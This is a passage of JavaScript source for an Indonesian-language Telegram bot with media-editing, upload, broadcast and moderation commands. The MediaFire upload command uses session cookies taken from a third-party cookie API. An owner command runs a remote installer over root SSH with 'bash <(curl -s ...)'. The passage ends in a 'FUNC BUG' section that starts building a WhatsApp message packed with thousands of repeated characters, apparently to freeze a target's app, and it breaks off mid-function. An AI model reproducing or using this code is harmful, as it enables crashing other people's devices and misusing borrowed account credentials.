        timeout: 60000
      }
    );

    await ctx.deleteMessage(processing.message_id).catch(() => {});

    if (!res.data?.status) {
      return ctx.reply("❌ Gagal menghasilkan prompt.");
    }

    const promptText = res.data.result;

    await ctx.reply(
      `✨ *Image to Prompt Result*\n\n${promptText}`,
      {
        parse_mode: "Markdown",
        reply_to_message_id: ctx.message.message_id
      }
    );

  } catch (err) {
    console.error("IMG2PROMPT ERROR:", err.response?.data || err.message || err);
    ctx.reply("❌ Terjadi kesalahan saat memproses gambar.");
  }
});
bot.command("uploadmf", async (ctx) => {
  const userId = ctx.from.id;
  const isOwner = userId === CumaIkyy;

  if (!ctx.message.reply_to_message) {
    return ctx.reply("❌ Reply file/media yang mau diupload ke MediaFire");
  }

  const job = async () => {
    try {
      const q = ctx.message.reply_to_message;
      const file =
        q.document || q.video || q.audio;

      if (!file) {
        return ctx.reply("❌ File tidak didukung");
      }

      await ctx.reply("🚀 Upload ke MediaFire dimulai...");

      const tgFile = await ctx.telegram.getFile(file.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${tgFile.file_path}`;
      const res = await axios.get(fileUrl, { responseType: "arraybuffer" });
      const buffer = Buffer.from(res.data);

      const filename =
        file.file_name || `upload_${Date.now()}`;

      const fileSize = buffer.length;
      const fileHash = crypto.createHash("sha256").update(buffer).digest("hex");

      const COOKIE_API_URL = "https://cookies.ryzecodes.xyz/api/cookies";
      const USER_AGENT = "Mozilla/5.0";

      const cookieRes = await axios.get(COOKIE_API_URL);
      const cookies = cookieRes.data.cookies
        .map(c => `${c.name}=${c.value}`)
        .join("; ");

      const baseHeaders = {
        "User-Agent": USER_AGENT,
        "Cookie": cookies,
        "Origin": "https://app.mediafire.com",
        "Referer": "https://app.mediafire.com/"
      };

      const tokenRes = await axios.post(
        "https://www.mediafire.com/application/get_session_token.php",
        "response_format=json",
        { headers: { ...baseHeaders, "Content-Type": "application/x-www-form-urlencoded" } }
      );

      const sessionToken = tokenRes.data.response.session_token;

      const actionRes = await axios.post(
        "https://www.mediafire.com/api/1.5/user/get_action_token.php",
        `session_token=${sessionToken}&response_format=json&type=upload`,
        { headers: { ...baseHeaders, "Content-Type": "application/x-www-form-urlencoded" } }
      );

      const actionToken = actionRes.data.response.action_token;

      const checkForm = new FormData();
      checkForm.append("uploads", JSON.stringify([{
        filename,
        folder_key: "myfiles",
        size: fileSize,
        hash: fileHash,
        resumable: "yes"
      }]));
      checkForm.append("session_token", sessionToken);
      checkForm.append("response_format", "json");

      const checkRes = await axios.post(
        "https://www.mediafire.com/api/1.5/upload/check.php",
        checkForm,
        { headers: { ...baseHeaders, ...checkForm.getHeaders() } }
      );

      const uploadUrl =
        checkRes.data.response.upload_url.resumable;

      const uploadRes = await axios.post(
        `${uploadUrl}?session_token=${sessionToken}&action_token=${actionToken}&response_format=json`,
        buffer,
        {
          headers: {
            "User-Agent": USER_AGENT,
            "Content-Type": "application/octet-stream",
            "x-file-hash": fileHash,
            "x-file-size": fileSize,
            "x-file-name": filename
          },
          maxBodyLength: Infinity
        }
      );

      const uploadKey = uploadRes.data.response.doupload.key;

      // POLLING
      let quickKey;
      for (let i = 0; i < 20; i++) {
        const poll = new FormData();
        poll.append("key", uploadKey);
        poll.append("session_token", sessionToken);
        poll.append("response_format", "json");

        const pollRes = await axios.post(
          "https://www.mediafire.com/api/1.5/upload/poll_upload.php",
          poll,
          { headers: { ...baseHeaders, ...poll.getHeaders() } }
        );

        const d = pollRes.data.response.doupload;
        if (d.status === "99") {
          quickKey = d.quickkey;
          break;
        }

        await new Promise(r => setTimeout(r, 2000));
      }

      if (!quickKey) throw new Error("Gagal ambil link");

      await ctx.reply(
        `✅ *UPLOAD BERHASIL*\n\n📄 ${filename}\n🔗 https://www.mediafire.com/file/${quickKey}/`,
        { parse_mode: "Markdown" }
      );

    } catch (e) {
      console.error(e);
      ctx.reply("❌ Upload gagal.");
    }
  };

  if (isOwner) {
    await ctx.reply("👑 Owner skip antrian");
    return job();
  }

  uploadQueue.push(job);
  await ctx.reply(
    `📥 Masuk antrian\n📌 Posisi: ${uploadQueue.length}\n⏱ 1 menit / user`
  );

  processQueue();
});
// === COMMAND /hd ===
bot.command("hd", async (ctx) => {
  const reply = ctx.message.reply_to_message;
  if (!reply || !reply.photo)
    return ctx.reply("❌ Reply ke foto dulu!");

  const loading = await ctx.reply("⏳ Meng-upscale gambar...");

  try {
    const photo = reply.photo.at(-1);
    const fileInfo = await ctx.telegram.getFile(photo.file_id);
    const tgFileUrl = `https://api.telegram.org/file/bot${bot.token}/${fileInfo.file_path}`;
    const stream = await axios.get(tgFileUrl, { responseType: "stream" });

    const fileName = `upscale_${Date.now()}.jpg`;
    const mimeType = mime.lookup(fileName) || "application/octet-stream";

    const form = new FormData();
    form.append("file", stream.data, {
      filename: fileName,
      contentType: mimeType,
    });

    const uploadRes = await axios.post(
      "https://ikyyzx-uploader.lol/upload",
      form,
      {
        headers: {
          ...form.getHeaders(),
          Accept: "application/json",
        },
        maxBodyLength: Infinity,
        maxContentLength: Infinity,
      }
    );

    const uploadedUrl = uploadRes.data.url;

    const { data } = await axios.get(
      "https://ikyyzyyrestapi.my.id/tools/upscale",
      {
        params: {
          apikey: "kyzz",
          url: uploadedUrl,
        },
      }
    );

    if (!data.status || !data.result?.result_url)
      throw new Error("Upscale gagal");

    await ctx.telegram.sendPhoto(
      ctx.chat.id,
      { url: data.result.result_url },
      { reply_to_message_id: reply.message_id }
    );

    await ctx.telegram.deleteMessage(ctx.chat.id, loading.message_id);

  } catch (err) {
    console.error(err?.response?.data || err);
    ctx.reply("❌ Gagal upscale gambar!");
  }
});
// === COMMAND /bratbahlil ===
bot.command("bratbahlil", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Contoh: /bratbahlil Mau Etanol?");

  try {
    const url = `https://ikyyzyyrestapi.my.id/maker/bratbahlil?text=${encodeURIComponent(text)}`;

    const res = await axios.get(url, {
      responseType: "arraybuffer"
    });

    const buffer = Buffer.from(res.data);

    await ctx.replyWithSticker({ source: buffer });
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Gagal bikin sticker.");
  }
});
// === COMMAND /jadihitam ===
bot.command("jadihitam", async (ctx) => {
try {
const reply = ctx.message.reply_to_message;
if (!reply || !reply.photo)
return ctx.reply("❗ Reply foto lalu ketik:\n/jadihitam");

const loading = await ctx.reply("🎨 Memproses jadi hitam...");  

const photo = reply.photo[reply.photo.length - 1];  
const fileLink = await ctx.telegram.getFileLink(photo.file_id);  

// ===============================  
// 1. DOWNLOAD FOTO DARI TELEGRAM  
// ===============================  
const imgRes = await axios.get(fileLink.href, {  
  responseType: "arraybuffer",  
  timeout: 30000,  
  maxContentLength: Infinity,  
  maxBodyLength: Infinity  
});  

const imgBuffer = imgRes.data;  

// ===============================  
// 2. UPLOAD KE UPLOADER LU  
// ===============================  
const FormData = require("form-data");  
const form = new FormData();  

form.append("file", imgBuffer, {  
  filename: `tg_${Date.now()}.jpg`,  
  contentType: "image/jpeg"  
});  

const uploadRes = await axios.post(  
  "https://ikyyzx-uploader.lol/upload",  
  form,  
  {  
    headers: form.getHeaders(),  
    timeout: 30000,  
    maxContentLength: Infinity,  
    maxBodyLength: Infinity  
  }  
);  

if (!uploadRes.data?.success || !uploadRes.data?.url) {  
  throw new Error("Upload gagal: " + JSON.stringify(uploadRes.data));  
}  

const publicUrl = uploadRes.data.url;  

// ===============================  
// 3. HIT API LU  
// ===============================  
const apiRes = await axios.get(  
  "https://ikyyzyyrestapi.my.id/edit/jadihitam",  
  {  
    params: { url: publicUrl },  
    timeout: 60000, // biarin long process  
    validateStatus: () => true  
  }  
);  

if (!apiRes.data?.status || !apiRes.data?.result) {  
  throw new Error("API gagal: " + JSON.stringify(apiRes.data));  
}  

// ===============================  
// 4. DOWNLOAD HASIL  
// ===============================  
const resultRes = await axios.get(apiRes.data.result, {  
  responseType: "arraybuffer",  
  timeout: 30000,  
  maxContentLength: Infinity,  
  maxBodyLength: Infinity  
});  

const resultBuffer = resultRes.data;  

await ctx.deleteMessage(loading.message_id).catch(() => {});  

// ===============================  
// 5. KIRIM KE USER  
// ===============================  
await ctx.replyWithPhoto(  
  { source: Buffer.from(resultBuffer) },  
  {  
    caption: "✅ Berhasil dijadikan hitam!"  
  }  
);

} catch (err) {
console.error("JadiHitam Error FULL:", err.response?.data || err.message || err);

ctx.reply(  
  "❌ Gagal memproses gambar.\n\n" +  
  "Detail: " + (err.message || "Unknown error")  
);

}
});
bot.command("jadihijab", async (ctx) => {
  try {
    let fileId;

    // ===============================
    // 1️⃣ Ambil Foto
    // ===============================
    if (ctx.message.reply_to_message?.photo) {
      fileId = ctx.message.reply_to_message.photo.slice(-1)[0].file_id;
    } 
    else if (ctx.message.photo) {
      fileId = ctx.message.photo.slice(-1)[0].file_id;
    } 
    else {
      return ctx.reply("❌ Kirim atau reply foto dengan command ini.");
    }

    const loading = await ctx.reply("📤 Mengupload gambar...");

    // ===============================
    // 2️⃣ Download dari Telegram
    // ===============================
    const fileLink = await ctx.telegram.getFileLink(fileId);

    const imageBuffer = await axios.get(fileLink.href, {
      responseType: "arraybuffer"
    });

    // ===============================
    // 3️⃣ Upload ke Uguu
    // ===============================
    const form = new FormData();
    form.append("files[]", imageBuffer.data, "image.jpg");

    const upload = await axios.post("https://uguu.se/upload.php", form, {
      headers: form.getHeaders()
    });

    if (!upload.data?.files?.[0]?.url) {
      await ctx.deleteMessage(loading.message_id).catch(() => {});
      return ctx.reply("❌ Gagal upload gambar.");
    }

    const imageUrl = upload.data.files[0].url;

    await ctx.deleteMessage(loading.message_id).catch(() => {});
    const processing = await ctx.reply("🎨 Sedang memproses...");

    // ===============================
    // 4️⃣ Call API (langsung image)
    // ===============================
    const resultImage = await axios.get(
      "https://ikyyzyyrestapi.my.id/edit/jadihijab",
      {
        params: { url: imageUrl },
        responseType: "arraybuffer", // PENTING!
        timeout: 120000
      }
    );

    await ctx.deleteMessage(processing.message_id).catch(() => {});

    // ===============================
    // 5️⃣ Kirim hasil gambar
    // ===============================
    await ctx.replyWithPhoto(
      { source: Buffer.from(resultImage.data) },
      {
        reply_to_message_id: ctx.message.message_id
      }
    );

  } catch (err) {
    console.error("JADIHIJAB ERROR:", err.response?.data || err.message || err);
    ctx.reply("❌ Terjadi kesalahan saat memproses gambar.");
  }
});
// === Command Broadcast ===
bot.command("broadcast", async (ctx) => {
  const userId = ctx.from.id;

  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
    return ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
  }

  const reply = ctx.message.reply_to_message;
  const text = ctx.message.text.split(" ").slice(1).join(" ");

  if (!reply && !text) {
    return ctx.reply(
      "⚠️ Gunakan:\n" +
      "- `/broadcast teks`\n" +
      "- Balas pesan lalu `/broadcast`"
    );
  }

  const allUsers = Object.keys(userJir);

  if (userId === CumaIkyy) {
    let sukses = 0;
    let gagal = 0;

    for (const id of allUsers) {
      try {
        if (reply) {
          if (reply.photo) {
            await ctx.telegram.sendPhoto(
              id,
              reply.photo.at(-1).file_id,
              { caption: reply.caption || "" }
            );
          } else if (reply.video) {
            await ctx.telegram.sendVideo(
              id,
              reply.video.file_id,
              { caption: reply.caption || "" }
            );
          } else if (reply.text) {
            await ctx.telegram.sendMessage(id, `📢 *Broadcast*\n\n${reply.text}`, {
              parse_mode: "Markdown"
            });
          }
        } else {
          await ctx.telegram.sendMessage(id, `📢 *Broadcast*\n\n${text}`, {
            parse_mode: "Markdown"
          });
        }
        sukses++;
      } catch (e) {
        gagal++;
      }
    }

    return ctx.reply(
      `✅ *Broadcast selesai!*\n\n` +
      `📬 Berhasil: ${sukses}\n` +
      `❌ Gagal: ${gagal}`,
      { parse_mode: "Markdown" }
    );
  }

  const reqId = Date.now().toString(36);

  pendingBroadcast[reqId] = {
    fromId: userId,
    reply,
    text
  };

  await ctx.telegram.sendMessage(
    CumaIkyy,
    `📢 *Permintaan Broadcast*\n\n` +
    `👤 Dari: ${ctx.from.first_name}\n` +
    `🆔 ID: ${userId}\n` +
    `👥 Target: ${allUsers.length} user\n\n` +
    `Setujui broadcast ini?`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Setujui", callback_data: `bc_ok_${reqId}` },
            { text: "❌ Tolak", callback_data: `bc_no_${reqId}` }
          ]
        ]
      }
    }
  );

  return ctx.reply("⏳ Broadcast dikirim ke owner utama untuk persetujuan.");
});
// === /broadcast (support media + teks) ===
bot.command("broadcastv2", async (ctx) => {
  if (ctx.from.id !== CumaIkyy)
    return ctx.reply("🚫 Akses ditolak! Hanya owner utama yang bisa melakukan broadcast.");

  const caption = ctx.message.text.split(" ").slice(1).join(" ");
  const replyMsg = ctx.message.reply_to_message;
  const messageText = caption || (replyMsg && (replyMsg.caption || replyMsg.text));

  if (!messageText && !replyMsg)
    return ctx.reply("📢 Contoh:\n\n/broadcast Halo semua user aktif!\n\nAtau reply pesan (teks/foto/video/dokumen) dengan perintah ini.");

  const botsData = loadBots();
  const totalBots = Object.keys(botsData).length;

  // === Ambil semua user dari ./lib/users.json ===
  let users = [];
  if (fs.existsSync(USERS_FILE)) {
    users = JSON.parse(fs.readFileSync(USERS_FILE, "utf-8"));
  }
  const totalUsers = users.length;

  await ctx.reply(
    `📢 Mengirim broadcast ke <b>${totalUsers}</b> user dan <b>${totalBots}</b> sub-bot aktif...\n\nPesan:\n<blockquote>${messageText || "Media"}</blockquote>`,
    { parse_mode: "HTML" }
  );

  let success = 0, fail = 0;

  // === FUNGSI KIRIM MEDIA / TEKS ===
  async function sendMessage(telegram, id) {
    try {
      if (replyMsg) {
        if (replyMsg.photo) {
          const fileId = replyMsg.photo.pop().file_id;
          await telegram.sendPhoto(id, fileId, { caption: messageText || "", parse_mode: "HTML" });
        } else if (replyMsg.video) {
          const fileId = replyMsg.video.file_id;
          await telegram.sendVideo(id, fileId, { caption: messageText || "", parse_mode: "HTML" });
        } else if (replyMsg.document) {
          const fileId = replyMsg.document.file_id;
          await telegram.sendDocument(id, fileId, { caption: messageText || "", parse_mode: "HTML" });
        } else if (replyMsg.voice) {
          const fileId = replyMsg.voice.file_id;
          await telegram.sendVoice(id, fileId, { caption: messageText || "", parse_mode: "HTML" });
        } else if (replyMsg.audio) {
          const fileId = replyMsg.audio.file_id;
          await telegram.sendAudio(id, fileId, { caption: messageText || "", parse_mode: "HTML" });
        } else {
          await telegram.sendMessage(id, messageText, { parse_mode: "HTML" });
        }
      } else {
        await telegram.sendMessage(id, messageText, { parse_mode: "HTML" });
      }
      success++;
    } catch {
      fail++;
    }
  }

  // === Kirim ke semua user utama ===
  for (const id of users) {
    await sendMessage(bot.telegram, id);
    await new Promise((r) => setTimeout(r, 100));
  }

  // === Kirim ke semua sub-bot aktif ===
  for (const [token, subBot] of Object.entries(activeSubBots || {})) {
    try {
      const me = await subBot.telegram.getMe();
      await subBot.telegram.sendMessage(
        CumaIkyy,
        `📡 Broadcast diteruskan ke sub-bot @${me.username}`,
        { parse_mode: "HTML" }
      );
      for (const id of users) {
        await sendMessage(subBot.telegram, id);
        await new Promise((r) => setTimeout(r, 150));
      }
      success++;
    } catch (e) {
      fail++;
      console.error("Sub-bot error:", e.message);
    }
  }

  await ctx.reply(
    `✅ Broadcast selesai!\n\n🟢 Berhasil: ${success}\n🔴 Gagal: ${fail}`,
    { parse_mode: "HTML" }
  );
});
bot.command("ytplay", async ctx => {
  try {
    const q = ctx.message.text.split(" ").slice(1).join(" ");
    if (!q) {
      return ctx.reply("Contoh: /ytplay dj ambatukam x pop mie");
    }

    await ctx.reply("🎶 Sedang mencari & menyiapkan audio...");

    const { data } = await axios.get(`https://api.zenzxz.my.id/search/play?query=${encodeURIComponent(q)}`);

    if (!data.status) {
      return ctx.reply("⚠️ Lagu tidak ditemukan.");
    }

    const { metadata, ytmp3 } = data;

    // kirim thumbnail + detail lagu
    await ctx.replyWithPhoto(
      { url: metadata.thumbnail },
      {
        caption: `
<blockquote>🎶 <b>Hasil Pencarian</b></blockquote>

<b>🎵 Judul :</b> ${metadata.title}
<b>📺 Channel :</b> ${metadata.channelTitle}
<b>⏱ Durasi :</b> ${metadata.duration}
<b>👁 Views :</b> ${metadata.viewCount}
<b>👍 Likes :</b> ${metadata.likeCount}

🔗 <a href="https://youtu.be/${metadata.videoId}">Link YouTube</a>
        `,
        parse_mode: "HTML"
      }
    );

    // kirim audio
    await ctx.replyWithAudio(
      { url: ytmp3 },
      {
        caption: `✅ <b>Berhasil Download</b>\n🎵 ${metadata.title}`,
        parse_mode: "HTML",
        title: metadata.title,
        performer: metadata.channelTitle
      }
    );

  } catch (e) {
    console.error(e);
    ctx.reply("⚠️ Terjadi error, coba lagi nanti.");
  }
});

async function sendRandomTikTok(ctx) {
  const url =
    "https://ikyyzyyrestapi.my.id/random/tiktok?rnd=" + Date.now();

  return ctx.replyWithVideo(
    { url },
    {
      caption: "🎲 Random TikTok",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔁 Ambil Lagi", callback_data: "tiktok_random" }]
        ]
      }
    }
  );
}
async function sendRandomTikTokMeme(ctx) {
  const url =
    "https://ikyyzyyrestapi.my.id/random/tiktokmeme?rnd=" + Date.now();

  return ctx.replyWithVideo(
    { url },
    {
      caption: "😂 Random TikTok Meme",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔁 Ambil Lagi", callback_data: "tiktok_meme_random" }]
        ]
      }
    }
  );
}
async function sendRandomTikTokTobrut(ctx) {
  const url =
    "https://ikyyzyyrestapi.my.id/random/tiktok/tobrut?rnd=" + Date.now();

  return ctx.replyWithVideo(
    { url },
    {
      caption: "🔥 Random TikTok Tobrut",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔁 Ambil Lagi", callback_data: "tiktok_tobrut_random" }]
        ]
      }
    }
  );
}

bot.command("tiktoktobrut", async (ctx) => {
  try {
    await sendRandomTikTokTobrut(ctx);
  } catch (e) {
    console.error(e);
    ctx.reply("❌ Gagal ambil video Tobrut");
  }
});
bot.action("tiktok_tobrut_random", async (ctx) => {
  await ctx.answerCbQuery("⏳ Mengambil video tobrut...").catch(() => {});

  try {
    // ubah caption jadi loading
    await ctx
      .editMessageCaption("⏳ Mengambil video TikTok Tobrut...")
      .catch(() => {});

    await new Promise(res => setTimeout(res, 700));

    // hapus video lama
    await ctx.deleteMessage().catch(() => {});

    // kirim video baru (button tetap ada)
    await sendRandomTikTokTobrut(ctx);
  } catch (e) {
    console.error(e);
    ctx.reply("❌ Gagal ambil video Tobrut");
  }
});
bot.command("tiktokmeme", async (ctx) => {
  try {
    await sendRandomTikTokMeme(ctx);
  } catch (e) {
    console.error(e);
    ctx.reply("❌ Gagal ambil video TikTok Meme");
  }
});
bot.command("kalkulator", ctx => {
  const text = ctx.message.text.split(" ").slice(1).join("").replace(/,/g, ".");
  if (!text) return ctx.reply("❌ Contoh: /kalkulator 12+14");

  // hanya boleh angka + operator dasar
  if (!/^[0-9.+\-*/() ]+$/.test(text))
    return ctx.reply("❌ Hanya boleh angka dan operator + - * /");

  try {
    // parsing manual tanpa eval
    const result = Function('"use strict"; return (' + text + ')')();

    if (!isFinite(result))
      return ctx.reply("❌ Perhitungan tidak valid");

    ctx.reply(`🧮 ${text} = ${result}`);
  } catch (e) {
    ctx.reply("❌ Format salah.\nContoh: /kalkulator 8*4");
  }
});
bot.command("totalgrup", async (ctx) => {
  // 🔐 AKSES KHUSUS
  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
    return ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
  }

  const totalGrup = db.groups.length;

  // hitung siapa aja yang nambahin bot
  const uniqueAdder = new Set(db.groups.map(g => g.addedBy)).size;

  await ctx.reply(
    `📊 <b>STATISTIK GRUP BOT</b>\n\n` +
    `👥 Total Grup : <b>${totalGrup}</b>\n` +
    `👤 User Penambah Bot : <b>${uniqueAdder}</b>`,
    { parse_mode: "HTML" }
  );
});

bot.command("addprem", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;

  const args = ctx.message.text.split(" ");
  const groupId = args[1];

  if (!groupId) {
    return ctx.reply("❌ Contoh:\n/addprem -100xxxxxxxxx");
  }

  const groupDB = getJSON(GROUP_USERS);
  const premDB = getJSON(PREMIUM);

  const users = groupDB[groupId];

  if (!users || users.length === 0) {
    return ctx.reply("❌ Belum ada member yang chat di grup itu.");
  }

  let added = 0;

  users.forEach(uid => {
    if (!premDB[uid]) {
      premDB[uid] = {
        from: groupId,
        at: Date.now()
      };
      added++;
    }
  });

  saveJSON(PREMIUM, premDB);

  ctx.reply(
    `✅ ADDPREM GRUP SELESAI\n\n` +
    `👥 Member terdata: ${users.length}\n` +
    `⭐ Premium ditambahkan: ${added}\n\n` +
    `⚠️ Catatan:\nHanya member yang pernah chat`
  );
});

bot.command("cekprem", (ctx) => {
  const prem = getJSON(PREMIUM);
  ctx.reply(prem[ctx.from.id] ? "✅ Kamu PREMIUM" : "❌ Kamu belum premium");
});

// ===== CONFIG =====
const OWNER_ID = 8441541694; // GANTI DENGAN ID TELEGRAM LU

function generateReadableString(length) {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
  let res = "";
  for (let i = 0; i < length; i++) {
    res += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return res;
}

// ===== COMMAND =====
bot.command("installpanel", async (ctx) => {
  if (ctx.from.id !== OWNER_ID)
    return ctx.reply("❌ <b>Owner only</b>", { parse_mode: "HTML" });

  const text = ctx.message.text.replace("/installpanel", "").trim();
  if (!text || text.split(",").length < 5) {
    return ctx.reply(
      `❌ <b>Format Salah</b>\n\n` +
      `<b>Gunakan:</b>\n` +
      `/installpanel ipvps, passwordvps, paneldomain, nodedomain, ram\n\n` +
      `<b>Contoh:</b>\n` +
      `/installpanel 192.168.1.1, mypassword, panel.example.com, node.example.com, 2048`,
      { parse_mode: "HTML" }
    );
  }

  let [vpsIP, vpsPassword, panelDomain, nodeDomain, nodeRAM] =
    text.split(",").map(v => v.trim());

  const dbName = generateReadableString(8);
  const dbUsername = generateReadableString(8);
  const randomNumber = Math.floor(1000 + Math.random() * 9000);
  const adminUser = `admin${randomNumber}`;
  const adminPass = `Admin${randomNumber}`;

  const ssh = new Client();

  ctx.reply(`🚀 <b>Memulai instalasi Panel</b>\n📡 VPS: <code>${vpsIP}</code>`, {
    parse_mode: "HTML",
  });

  // ===== INSTALL PANEL =====
  function installPanel() {
    ctx.reply("🔧 <b>Menginstall Pterodactyl Panel...</b>", { parse_mode: "HTML" });

    ssh.exec("bash <(curl -s https://pterodactyl-installer.se)", (err, stream) => {
      if (err) return ctx.reply("❌ Gagal menjalankan installer");

      stream.on("data", (data) => {
        const out = data.toString();
        console.log(out);

        if (out.includes("Input 0-6")) stream.write("0\n");
        if (out.includes("(y/N)")) stream.write("y\n");
        if (out.includes("Database name")) stream.write(`${dbName}\n`);
        if (out.includes("Database username")) stream.write(`${dbUsername}\n`);
        if (out.includes("Password")) stream.write("\n");
        if (out.includes("timezone")) stream.write("Asia/Jakarta\n");
        if (out.includes("email")) stream.write(`admin${randomNumber}@gmail.com\n`);
        if (out.includes("Username for the initial admin account"))
          stream.write(`${adminUser}\n`);
        if (out.includes("First name")) stream.write("Admin\n");
        if (out.includes("Last name")) stream.write("Panel\n");
        if (out.includes("Password for the initial admin account"))
          stream.write(`${adminPass}\n`);
        if (out.includes("Set the FQDN"))
          stream.write(`${panelDomain}\n`);
      });

      stream.on("close", makeLocation);
    });
  }

  // ===== LOCATION =====
  function makeLocation() {
    ctx.reply("📍 <b>Membuat lokasi panel...</b>", { parse_mode: "HTML" });

    ssh.exec(`
cd /var/www/pterodactyl && php artisan p:location:make <<EOF
Singapore
Lokasi Singapore
EOF
`, (_, stream) => {
      stream.on("close", () => makeNode(1));
    });
  }

  // ===== NODE =====
  function makeNode(locationId) {
    ctx.reply("🖥️ <b>Membuat node...</b>", { parse_mode: "HTML" });

    ssh.exec(`
cd /var/www/pterodactyl && php artisan p:node:make <<EOF
Node Singapore
Singapore
${locationId}
https
${nodeDomain}
yes
no
no
${nodeRAM}
${nodeRAM}
2048
2048
100
8080
2022
/var/lib/pterodactyl/volumes
EOF
`, (_, stream) => {
      stream.on("close", installWings);
    });
  }

  // ===== WINGS =====
  function installWings() {
    ctx.reply("🪽 <b>Menginstall Wings...</b>", { parse_mode: "HTML" });

    ssh.exec("bash <(curl -s https://pterodactyl-installer.se)", (_, stream) => {
      stream.on("data", (d) => {
        const out = d.toString();
        if (out.includes("Input 0-6")) stream.write("1\n");
        if (out.includes("(y/N)")) stream.write("y\n");
        if (out.includes("panel address")) stream.write(`${panelDomain}\n`);
        if (out.includes("FQDN")) stream.write(`${nodeDomain}\n`);
      });

      stream.on("close", () => {
        ssh.end();
        ctx.reply(
          `✅ <b>INSTALL SELESAI</b>\n\n` +
          `🌐 Panel: <code>${panelDomain}</code>\n` +
          `👤 User: <code>${adminUser}</code>\n` +
          `🔑 Pass: <code>${adminPass}</code>\n` +
          `🗄️ DB: <code>${dbName}</code>`,
          { parse_mode: "HTML" }
        );
      });
    });
  }

  ssh.on("ready", installPanel).connect({
    host: vpsIP,
    port: 22,
    username: "root",
    password: vpsPassword,
  });
});

////=== Fungsi Delete Session ===\\\\\\\
function deleteSession() {
  if (fs.existsSync(sessionPath)) {
    const stat = fs.statSync(sessionPath);

    if (stat.isDirectory()) {
      fs.readdirSync(sessionPath).forEach(file => {
        fs.unlinkSync(path.join(sessionPath, file));
      });
      fs.rmdirSync(sessionPath);
      console.log('Folder session berhasil dihapus.');
    } else {
      fs.unlinkSync(sessionPath);
      console.log('File session berhasil dihapus.');
    }

    return true;
  } else {
    console.log('Session tidak ditemukan.');
    return false;
  }
}
////////// OWNER MENU \\\\\\\\\
bot.command("status", checkOwner, checkGroupOnly, async (ctx) => {
  try {
    const waStatus = Abim && Abim.user
      ? "Terhubung"
      : "Tidak Terhubung";

    const message = `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━
┃ ⌬ STATUS WHATSAPP
┣━━━━━━━━━━━━━━━━━━━
┃ ⌬ STATUS : ${waStatus}
┗━━━━━━━━━━━━━━━━━━━
</blockquote>
`;

    await ctx.reply(message, {
      parse_mode: "HTML"
    });

  } catch (error) {
    console.error("Gagal menampilkan status bot:", error);
    ctx.reply("❌ Gagal menampilkan status bot.");
  }
});

/////////////////END/////////////////////////
bot.on("message", (ctx) => {
  if (!ctx.chat || !ctx.from) return;
  if (!["group", "supergroup"].includes(ctx.chat.type)) return;

  const groupId = ctx.chat.id;
  const userId = ctx.from.id;

  const db = getJSON(GROUP_USERS);

  if (!db[groupId]) db[groupId] = [];

  if (!db[groupId].includes(userId)) {
    db[groupId].push(userId);
    saveJSON(GROUP_USERS, db);
  }
});
bot.on("message", async (ctx) => {
  if (!ctx.chat || ctx.chat.type === "private") return;
  if (!antiLink[ctx.chat.id]) return;
  if (!ctx.message.text) return;

  // Jangan proses admin
  const member = await ctx.getChatMember(ctx.from.id);
  if (member.status === "administrator" || member.status === "creator") return;

  if (linkRegex.test(ctx.message.text)) {
    const chatId = ctx.chat.id;
    const userId = ctx.from.id;
    const userName = ctx.from.first_name;

    // Hapus pesan
    try {
      await ctx.deleteMessage();
    } catch (e) {
      return;
    }

    // Init warning
    if (!warns[chatId]) warns[chatId] = {};
    if (!warns[chatId][userId]) warns[chatId][userId] = 0;

    warns[chatId][userId]++;

    if (warns[chatId][userId] >= 3) {
      // Kick user
      try {
        await ctx.banChatMember(userId);
        await ctx.unbanChatMember(userId);

        ctx.reply(
          `👢 ${userName} dikeluarkan!\nAlasan: 3x kirim link`
        );

        warns[chatId][userId] = 0;
      } catch (err) {
        ctx.reply("❌ Bot tidak punya izin kick user");
      }
    } else {
      ctx.reply(
        `⚠️ Warning ${warns[chatId][userId]}/3\n` +
        `🚫 Dilarang kirim link!`
      );
    }
  }
});
bot.on("message", async (ctx) => {
  if (!ctx.chat || ctx.chat.type === "private") return;
  if (!ctx.message.text) return;

  const chatId = ctx.chat.id;
  if (!badWords[chatId]) return;

  const msgText = ctx.message.text.toLowerCase();

  for (const word of badWords[chatId]) {
    if (msgText.includes(word)) {
      try {
        await ctx.deleteMessage();
        await ctx.reply(
          `⚠️ Pesan dihapus!\nKata terlarang terdeteksi: "${word}"`
        );
      } catch (e) {}
      break;
    }
  }
});

bot.on('message', async (ctx, next) => {
  const msg = ctx.message;
  if (!msg.text) return next();
  if (msg.text.startsWith('/')) return next();

  // cek apakah user sedang dalam proses /fix
  const entry = [...pendingFix.entries()].find(([, v]) => v.uid === msg.from.id);
  if (!entry) return next();

  const [token, data] = entry;
  const userInput = msg.text.trim();
  pendingFix.delete(token);

  // Kalau user mengetik SKIP, langsung proses tanpa detail
  if (/^skip$/i.test(userInput)) {
    await ctx.reply('⎙ Memproses kode ... Mohon tunggu beberapa menit.', { parse_mode: 'Markdown' });
    return runFix(ctx, data.code, '');
  }

  // Jika bukan SKIP, pakai teks user sebagai detail
  await ctx.reply('⎙ Menganalisis dan memperbaiki kode berdasarkan deskripsi kamu... Mohon tunggu.', { parse_mode: 'Markdown' });
  await runFix(ctx, data.code, userInput);
});
 
///////////////////[FUNC BUG]////////////////
async function boeng(sock, target) {
  const ButtonFreeze = [];
  ButtonFreeze.push({
    name: "single_select",
    buttonParamsJson: ""
  });

  for (let i = 0; i < 20; i++) {
    ButtonFreeze.push({
      name: "cta_copy",
      buttonParamsJson: JSON.stringify({
        display_text: "ꦽ".repeat(5000)
      })
    });
